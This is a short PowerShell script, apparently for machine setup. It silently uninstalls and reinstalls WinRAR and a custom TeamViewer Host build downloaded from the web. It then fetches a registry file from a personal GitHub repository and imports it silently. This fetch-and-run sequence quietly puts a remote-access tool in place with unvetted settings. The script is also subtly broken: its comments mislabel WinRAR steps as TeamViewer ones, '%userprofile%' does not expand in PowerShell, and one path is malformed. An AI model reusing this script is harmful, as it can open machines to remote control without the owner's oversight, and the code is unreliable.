if ((gwmi win32_operatingsystem | select osarchitecture).osarchitecture -eq "64-bit")
 { 
#64 bit TeamViewer Uninstall 
Start-Process -FilePath "C:\Program Files\WinRAR\uninstall.exe" /s 
  #32 bit TeamViewer Uninstall 
Start-Process -Filepath "-file C:\Program Files (x86)\WinRAR\uninstall.exe" /s 
 } 
(New-Object Net.WebClient).DownloadFile('https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-623.exe', '%userprofile%\Desktop\winrar.exe') 
%userprofile%\Desktop\winrar.exe /s 


Start-Process -FilePath "C:\Program Files\TeamViewer\uninstall.exe" /S 
#32 bit TeamViewer Uninstall 
Start-Process -Filepath "C:\Program Files (x86)\TeamViewer\uninstall.exe"/S 
(New-Object Net.WebClient).DownloadFile('https://customdesignservice.teamviewer.com/download/windows/v15/vh7t6rv/TeamViewer_Host_Setup.exe', '%userprofile%\Desktop\packageq1.exe')
%userprofile%\Desktop\packageq1.exe /S 
Stop-Process -Name "TeamViewer" -Force
New-Item -ItemType File -Path C:\Temp\newfile.txt -Value "Hello World!" -Force
# تحميل ملف من الإنترنت
$url = "https://raw.githubusercontent.com/defeat11/sav2/main/Teamvwier.reg"
$outputPath = "%userprofile%\Desktop\reg.reg"
Invoke-WebRequest -Uri $url -OutFile $outputPath

# استيراد ملف تكوين التسجيل
$RegFilePath = "%userprofile%\Desktop\reg.reg"
Start-Process regedit -ArgumentList "/s $RegFilePath" -Wait

# إيقاف تشغيل TeamViewer
Stop-Process -Name "TeamViewer" -Force


